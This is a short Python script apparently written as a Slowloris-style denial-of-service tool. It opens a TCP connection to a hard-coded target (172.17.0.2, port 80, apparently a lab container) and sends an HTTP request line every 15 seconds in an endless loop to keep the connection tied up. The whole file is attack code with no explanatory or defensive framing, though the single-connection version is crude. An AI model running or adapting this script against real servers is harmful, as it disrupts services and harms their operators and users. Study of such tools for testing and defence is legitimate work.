import socket
import time


def slowloris(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    while True:
        s.send(b"GET / HTTP/1.1\r\n")
        time.sleep(15)


if __name__ == "__main__":
    target_ip = "172.17.0.2"
    target_port = 80

    slowloris(target_ip, target_port)
